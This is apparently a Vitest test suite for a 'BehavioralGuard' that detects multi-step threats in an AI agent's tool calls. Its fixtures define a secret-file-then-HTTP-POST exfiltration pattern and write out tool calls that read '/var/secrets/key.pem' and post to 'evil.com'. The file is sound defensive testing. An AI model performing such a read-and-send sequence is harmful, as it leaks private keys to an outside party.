import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { BehavioralGuard } from '../BehavioralGuard';
import { MemoryStore } from '../stores/MemoryStore';
import type { ToolCallEvent, ThreatPattern } from '../../types';

describe('BehavioralGuard', () => {
  let guard: BehavioralGuard;
  let store: MemoryStore;

  beforeEach(() => {
    store = new MemoryStore(3600000);
    guard = new BehavioralGuard({
      customStore: store,
      patterns: [
        {
          name: 'test-exfiltration',
          description: 'Test pattern',
          severity: 'critical',
          maxTimeWindow: 60000,
          steps: [
            {
              tool: 'read_file',
              args: { path: /secret/ },
            },
            {
              tool: 'http_post',
              timeWindow: 30000,
            },
          ],
        },
      ],
    });
  });

  afterEach(() => {
    store.stopCleanup();
    store.clear();
  });

  describe('Basic Detection', () => {
    it('detects behavioral threats across messages', async () => {
      // First event: read secret file
      const event1: ToolCallEvent = {
        sessionId: 'session-1',
        timestamp: Date.now(),
        tool: 'read_file',
        args: { path: '/var/secrets/key.pem' },
      };

      const result1 = await guard.check(event1);
      expect(result1.passed).toBe(true); // First event alone is not a threat

      // Second event: HTTP POST
      const event2: ToolCallEvent = {
        sessionId: 'session-1',
        timestamp: Date.now(),
        tool: 'http_post',
        args: { url: 'https://evil.com' },
      };

      const result2 = await guard.check(event2);
      expect(result2.passed).toBe(false);
      expect(result2.blocked).toBe(true);
      expect(result2.reason).toContain('test-exfiltration');
    });

    it('does not trigger on non-matching patterns', async () => {
      const event1: ToolCallEvent = {
        sessionId: 'session-1',
        timestamp: Date.now(),
        tool: 'read_file',
        args: { path: '/tmp/normal.txt' }, // Not a secret
      };

      const event2: ToolCallEvent = {
        sessionId: 'session-1',
        timestamp: Date.now(),
        tool: 'write_file',
        args: { path: '/tmp/output.txt' },
      };

      const result1 = await guard.check(event1);
      const result2 = await guard.check(event2);

      expect(result1.passed).toBe(true);
      expect(result2.passed).toBe(true);
    });

    it('keeps sessions isolated', async () => {
      // Session 1: read secret
      await guard.check({
        sessionId: 'session-1',
        timestamp: Date.now(),
        tool: 'read_file',
        args: { path: '/var/secrets/key.pem' },
      });

      // Session 2: HTTP POST (different session)
      const result = await guard.check({
        sessionId: 'session-2',
        timestamp: Date.now(),
        tool: 'http_post',
        args: { url: 'https://evil.com' },
      });

      expect(result.passed).toBe(true); // Different session, no threat
    });
  });

  describe('Input Formats', () => {
    it('accepts ToolCallEvent objects', async () => {
      const event: ToolCallEvent = {
        sessionId: 'session-1',
        timestamp: Date.now(),
        tool: 'read_file',
        args: { path: '/tmp/test.txt' },
      };

      const result = await guard.check(event);
      expect(result.passed).toBe(true);
    });

    it('accepts JSON strings', async () => {
      const eventJson = JSON.stringify({
        sessionId: 'session-1',
        tool: 'read_file',
        args: { path: '/tmp/test.txt' },
      });

      const result = await guard.check(eventJson);
      expect(result.passed).toBe(true);
    });

    it('handles non-tool-call input gracefully', async () => {
      const result = await guard.check('just a regular message');
      expect(result.passed).toBe(true);
      expect(result.reason).toContain('Not a tool call event');
    });

    it('adds timestamp if missing', async () => {
      const eventJson = JSON.stringify({
        sessionId: 'session-1',
        tool: 'read_file',
        args: { path: '/tmp/test.txt' },
        // No timestamp
      });

      const result = await guard.check(eventJson);
      expect(result.passed).toBe(true);
    });
  });

  describe('Race Condition Safety', () => {
    it('handles concurrent checks on same session safely', async () => {
      const events: ToolCallEvent[] = [];
      const now = Date.now();

      // Create 10 events
      for (let i = 0; i < 10; i++) {
        events.push({
          sessionId: 'session-1',
          timestamp: now + i * 1000,
          tool: 'read_file',
          args: { path: `/file${i}.txt` },
        });
      }

      // Check all events concurrently
      const promises = events.map((event) => guard.check(event));
      const results = await Promise.all(promises);

      // All checks should complete successfully
      expect(results).toHaveLength(10);
      results.forEach((result) => {
        expect(result).toHaveProperty('passed');
      });
    });

    it('handles concurrent checks on different sessions', async () => {
      const checks = [];

      // Create concurrent checks on 5 different sessions
      for (let i = 0; i < 5; i++) {
        checks.push(
          guard.check({
            sessionId: `session-${i}`,
            timestamp: Date.now(),
            tool: 'read_file',
            args: { path: `/file${i}.txt` },
          })
        );
      }

      const results = await Promise.all(checks);
      expect(results).toHaveLength(5);
    });
  });

  describe('Metadata', () => {
    it('includes session and event count in metadata', async () => {
      // Add 3 events
      for (let i = 0; i < 3; i++) {
        await guard.check({
          sessionId: 'session-1',
          timestamp: Date.now() + i * 1000,
          tool: 'read_file',
          args: { path: `/file${i}.txt` },
        });
      }

      // Check one more
      const result = await guard.check({
        sessionId: 'session-1',
        timestamp: Date.now(),
        tool: 'write_file',
        args: { path: '/output.txt' },
      });

      expect(result.metadata).toBeDefined();
      expect(result.metadata?.sessionId).toBe('session-1');
      expect(result.metadata?.eventCount).toBe(4);
    });

    it('includes threat details when blocked', async () => {
      await guard.check({
        sessionId: 'session-1',
        timestamp: Date.now(),
        tool: 'read_file',
        args: { path: '/var/secrets/key.pem' },
      });

      const result = await guard.check({
        sessionId: 'session-1',
        timestamp: Date.now(),
        tool: 'http_post',
        args: { url: 'https://evil.com' },
      });

      expect(result.metadata).toBeDefined();
      expect(result.metadata?.threats).toBeDefined();
      expect(Array.isArray(result.metadata?.threats)).toBe(true);
    });
  });

  describe('Confidence Scoring', () => {
    it('assigns correct confidence for critical severity', async () => {
      const criticalPattern: ThreatPattern = {
        name: 'critical-test',
        description: 'Critical severity pattern',
        severity: 'critical',
        maxTimeWindow: 60000,
        steps: [{ tool: 'dangerous_tool' }],
      };

      const guardWithPattern = new BehavioralGuard({
        customStore: new MemoryStore(),
        patterns: [criticalPattern],
      });

      const result = await guardWithPattern.check({
        sessionId: 'session-1',
        timestamp: Date.now(),
        tool: 'dangerous_tool',
        args: {},
      });

      expect(result.confidence).toBe(1.0);
    });

    it('assigns correct confidence for high severity', async () => {
      const highPattern: ThreatPattern = {
        name: 'high-test',
        description: 'High severity pattern',
        severity: 'high',
        maxTimeWindow: 60000,
        steps: [{ tool: 'suspicious_tool' }],
      };

      const guardWithPattern = new BehavioralGuard({
        customStore: new MemoryStore(),
        patterns: [highPattern],
      });

      const result = await guardWithPattern.check({
        sessionId: 'session-1',
        timestamp: Date.now(),
        tool: 'suspicious_tool',
        args: {},
      });

      expect(result.confidence).toBe(0.9);
    });
  });

  describe('Performance', () => {
    it('completes check in <1ms for typical session', async () => {
      // Add 50 events to session
      for (let i = 0; i < 50; i++) {
        await guard.check({
          sessionId: 'session-1',
          timestamp: Date.now() + i * 1000,
          tool: 'read_file',
          args: { path: `/file${i}.txt` },
        });
      }

      // Measure check time
      const start = performance.now();
      await guard.check({
        sessionId: 'session-1',
        timestamp: Date.now(),
        tool: 'write_file',
        args: { path: '/output.txt' },
      });
      const duration = performance.now() - start;

      expect(duration).toBeLessThan(5); // <5ms (includes storage + matching)
    });
  });

  describe('Session TTL', () => {
    it('only considers events within TTL window', async () => {
      const now = Date.now();

      // Old event (2 hours ago, outside 1 hour TTL)
      await guard.check({
        sessionId: 'session-1',
        timestamp: now - 7200000,
        tool: 'read_file',
        args: { path: '/var/secrets/key.pem' },
      });

      // New event
      const result = await guard.check({
        sessionId: 'session-1',
        timestamp: now,
        tool: 'http_post',
        args: { url: 'https://evil.com' },
      });

      // Should not match because old event is outside TTL
      expect(result.passed).toBe(true);
    });
  });

  describe('Built-in Patterns', () => {
    it('loads built-in patterns by default', () => {
      const defaultGuard = new BehavioralGuard();
      expect(defaultGuard).toBeDefined();
      expect(defaultGuard.name).toBe('behavioral');
    });

    it('allows custom patterns', () => {
      const customPattern: ThreatPattern = {
        name: 'custom-pattern',
        description: 'Custom test pattern',
        severity: 'medium',
        maxTimeWindow: 60000,
        steps: [{ tool: 'custom_tool' }],
      };

      const customGuard = new BehavioralGuard({
        patterns: [customPattern],
      });

      expect(customGuard).toBeDefined();
    });
  });
});
